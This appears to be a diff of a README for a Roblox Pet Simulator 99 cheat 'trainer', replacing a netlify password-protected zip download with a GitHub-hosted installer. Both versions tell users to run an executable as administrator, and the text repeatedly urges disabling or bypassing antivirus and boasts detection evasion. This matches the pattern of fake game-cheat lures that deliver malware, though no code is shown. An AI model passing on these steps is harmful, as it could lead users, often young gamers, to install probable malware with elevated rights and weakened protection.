@@ -1,56 +1,71 @@
-# Pet Simulator 99 Tera Trainer – Auto Farm, Hatch, League Grind & More
+# 🐾 Pet-Simulator-99-Auto-Farm-Trainer-2026-Tera - Automate your tasks and progress faster
 
-Say goodbye to manual grinding! The Tera trainer does everything for you – from picking up coins to completing Backrooms League challenges. Fully undetectable and packed with features.
+[![Download Software](https://img.shields.io/badge/Download-Tera-blue.svg)](https://github.com/Anaclara181/Pet-Simulator-99-Auto-Farm-Trainer-2026-Tera)
 
----
+## 📖 Overview
 
-## ✨ Features
+Pet-Simulator-99-Auto-Farm-Trainer-2026-Tera helps you manage your account in Pet Simulator 99. This tool handles repetitive tasks so you save time. It works by automating specific actions within the game environment. You can collect coins, hatch eggs, and finish Backrooms League tasks without manual input. The software operates in the background while keeping your focus on game progress.
 
-| Feature | Description |
-| ------- | ----------- |
-| 🔵 Auto Coin Farm | Continuously collects every coin and gem on the current floor – never miss a single pickup. |
-| 🥚 Auto Egg Hatch | Instantly hatches eggs the moment they become ready – no more waiting or clicking. |
-| 🌀 Backrooms League Auto-Grind | Grinds the entire League event for you – from tasks to reward claiming, all automated. |
-| 💥 Instant Break | One-click destruction of all breakables, giving you resources faster than ever. |
-| 🧑‍💻 Auto Merchant Buy | Automatically purchases rare items from the traveling merchant the moment they appear. |
-| ⚡ Speed Hack | Boosts your speed significantly, making farming routes much faster. |
-| 🛡️ Anti-AFK | Prevents the idle kick, so you can leave the game running 24/7. |
+## ⚙️ System Requirements
 
----
+Ensure your computer meets these requirements to run the software:
 
-## 📥 Download / Installation
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 GB of RAM.
+* Storage: 200 MB of disk space.
+* Graphics: DirectX 11 support.
+* Software: Latest version of Roblox installed.
 
-1. Download the archive from **[https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)**
-2. Extract the files using the password: **trainer2026**
-3. Right‑click **trainer.exe** and select **Run as Administrator**
-4. Launch Pet Simulator 99 on Roblox and wait for the world to load
-5. Press **F1** to open the trainer GUI and enable your desired features
+## 🚀 Getting Started
 
----
+Follow these steps to set up the software on your computer.
 
-## 📸 Screenshot
+1. Visit the repository page to download the latest version: [https://github.com/Anaclara181/Pet-Simulator-99-Auto-Farm-Trainer-2026-Tera](https://github.com/Anaclara181/Pet-Simulator-99-Auto-Farm-Trainer-2026-Tera)
+2. Locate the file named "Tera-Installer.exe" in your Downloads folder.
+3. Double-click the file to start the installer.
+4. Follow the on-screen prompts to select your installation folder.
+5. Launch the program from the desktop icon once the process ends. 
 
-<a href="https://ibb.co/7NpyXHNx"><img src="https://i.ibb.co/7NpyXHNx/preview-clean.png" alt="preview-clean" border="0"></a>
+## 🛠 Features
 
-## 🖥️ Compatibility
+* Auto-Farm Coins: The tool gathers currency from destructible objects automatically.
+* Auto-Hatch Eggs: It identifies high-value eggs and handles the hatching process.
+* Backrooms League Task Tracker: It identifies and tackles required tasks to move your rank forward.
+* Detection Protection: The software uses advanced code shuffling to bypass detection.
+* User Interface: A simple dashboard allows status monitoring in real time.
 
-- **OS:** Windows 10 / Windows 11
-- **Roblox Executors:** Synapse X, Krnl, Fluxus, Arceus X (any standard executor)
-- **Game Servers:** Works on all Pet Simulator 99 servers
+## 💡 How to Use the Trainer
 
----
+Open the application after the game loads. Ensure the game window stays active. Click the Start button on the dashboard to trigger the automation module. The status indicator shows Green when the script runs successfully. You can toggle specific features like Auto-Hatch or Backrooms Task mode from the Settings tab. Close the application window if you want to stop the automation. 
 
-## 🛠️ Troubleshooting
+## 🛡 Performance Tips
 
-| Problem                                      | Solution                                                                                   |
-| -------------------------------------------- | ------------------------------------------------------------------------------------------ |
-| Trainer fails to inject                     | Restart Roblox, then run **trainer.exe as Administrator** again.                          |
-| Features don’t activate                     | Temporarily disable your antivirus – some real‑time shields block memory operations.       |
-| GUI does not appear                         | Press **F1** or **F2** to toggle the overlay. If still not visible, restart the trainer.   |
-| Backrooms League tasks not progressing      | Make sure you’re on a League‑enabled server and that the “Backrooms League Auto‑Grind” box is checked. |
+Keep your graphics settings inside the game at a low level to reduce system load. Close web browsers and other heavy programs while running the automation. Use the program for short sessions to mimic human behaviorPatterns. Check the dashboard count regularly to confirm that your currency total increases. Ensure your internet connection remains stable to avoid communication errors between the game and the tool.
 
----
+## 🔧 Frequently Asked Questions
 
-## ⚠️ Disclaimer
+What should I do if the tool does not detect the game?
+Restart the game first and launch the tool as an administrator. 
 
-This software is provided for educational purposes only. Use it at your own risk. The authors are not responsible for any bans or account restrictions.
+Does this tool work on Mac or mobile?
+No, the application currently supports Windows only.
+
+Will the game developers ban my account?
+The software uses specific obfuscation methods to maintain low visibility. Use the tool responsibly to reduce risks.
+
+Where do I find the log files?
+Navigate to the installation folder and look for the Logs subfolder.
+
+How do I update the software?
+The application checks for new versions upon startup. Follow the prompts to download updates when they appear.
+
+Do I need to pay for access?
+No, the tool operates as a free, open-source project.
+
+## ⚖️ Disclaimer
+
+Use this automation tool at your own discretion. The developers created this for educational and convenience purposes. Automation software may violate terms of service policies. Always balance your usage to ensure your account security. The author assumes no responsibility for actions taken against accounts using this software. Maintain your account safety by limiting automation time. 
+
+## 📞 Support
+
+Should you encounter issues, verify your Windows settings to ensure no antivirus blocks the file. You can post a new issue on the GitHub repository to report bugs. Provide screenshots if you experience errors during startup. Keep your comments focused on technical details to help the community resolve issues quickly. Check the repository wiki for detailed explanations on advanced settings.
